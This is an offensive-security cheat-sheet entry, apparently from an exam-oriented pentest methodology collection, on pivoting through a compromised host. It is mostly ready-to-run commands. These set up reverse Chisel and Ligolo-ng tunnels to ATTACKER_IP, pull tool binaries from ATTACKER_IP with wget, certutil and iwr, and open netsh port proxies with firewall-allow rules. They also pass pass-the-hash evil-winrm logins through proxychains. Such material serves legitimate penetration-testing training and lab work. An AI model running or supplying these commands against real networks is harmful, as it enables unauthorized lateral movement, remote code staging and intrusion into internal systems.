---
id: pivot
title: Pivot / Tunneling
stage: objective
tags: [windows, linux]
summary: Route traffic through a compromised host to reach additional network segments — Ligolo-ng eliminates proxychains overhead, Chisel works through strict firewalls.
leads_to:
  - nmap-scan
  - smb-enum
  - ldap-enum
---

## Prerequisites

A shell on a machine with access to a network segment your attacker box can't reach directly. The pivot host must have outbound TCP connectivity to your attacker IP. `ipconfig /all` or `ip a` revealing multiple NICs or routes is your indicator.

Pivoting routes your attack traffic through a compromised host to reach segments that are otherwise unreachable. Every foothold should immediately be checked for additional NICs, route table entries, and internal listeners — these indicate pivot opportunities. Ligolo-ng is the cleanest option for exam environments (no proxychains overhead, tools work natively). Chisel is more portable and firewall-friendly for restrictive egress rules.

## Quick Win

> Check for additional networks immediately on every foothold — then pivot with Ligolo-ng.

```bash
# Linux
ip a && ip route && cat /etc/hosts

# Windows
ipconfig /all && route print && netstat -ano
```

## Chisel (Works Through Strict Firewalls)

> Reverse SOCKS5 proxy — target connects out, bypasses most firewall restrictions.

```bash
# Attacker
./chisel server --port 9090 --reverse

# Pivot host — creates SOCKS5 at attacker:1080
./chisel client ATTACKER_IP:9090 R:socks

# Specific port forward
./chisel client ATTACKER_IP:9090 R:8080:10.10.10.5:80
```

```bash
# Transfer to target
wget http://ATTACKER_IP:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
certutil -urlcache -f http://ATTACKER_IP:8000/chisel.exe C:\Windows\Temp\chisel.exe
```

## Ligolo-ng (Best for Multi-Hop Networks)

> Creates a TUN interface — no proxychains needed, tools work as if directly connected.

```bash
# Attacker
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot host
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Ligolo console
session         # select session
ifconfig        # see pivot's interfaces
start           # start tunnel

# Add route on attacker (traffic routes natively — no proxychains)
sudo ip route add 10.10.10.0/24 dev ligolo
nmap -Pn -sV 10.10.10.5
```

## SSH Tunneling

> Built-in to every Linux host — dynamic SOCKS proxy or specific port forwards.

```bash
# Dynamic SOCKS proxy (route all traffic through pivot)
ssh -D 1080 -N user@PIVOT_HOST

# Local port forward (pull specific remote service to localhost)
ssh -L 8080:10.10.10.5:80 user@PIVOT_HOST
```

## Netsh (Windows — No Tools Needed)

> Built-in Windows port proxy — works when you can't transfer binaries.

```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.10.5 connectport=80
netsh advfirewall firewall add rule name="pivot" dir=in action=allow protocol=TCP localport=8080
```

## Proxychains Usage

> Required when using Chisel/SSH SOCKS — must use TCP connect scan with nmap.

```bash
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -Pn -sT -p 22,80,443,139,445,3389,5985 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u Administrator -H HASH
proxychains nxc smb 10.10.10.0/24 -u user -p pass
```

## File Transfer

> Serve files from attacker — Python HTTP for Linux, SMB server for Windows targets.

```bash
python3 -m http.server 8000
impacket-smbserver share $(pwd) -smb2support

# Windows download
certutil -urlcache -f http://ATTACKER_IP:8000/file.exe C:\Windows\Temp\file.exe
iwr http://ATTACKER_IP:8000/file.exe -o C:\Windows\Temp\file.exe

# Linux download
wget http://ATTACKER_IP:8000/file -O /tmp/file
```

## Leads To

Pivot established → restart the entire recon cycle on the new segment: nmap-scan all hosts, smb-enum and ldap-enum if AD is present. Ligolo-ng is cleaner for exam environments — direct tool usage without proxychains. New subnets often contain additional domain controllers, internal services, or targets that were not reachable from the initial foothold.
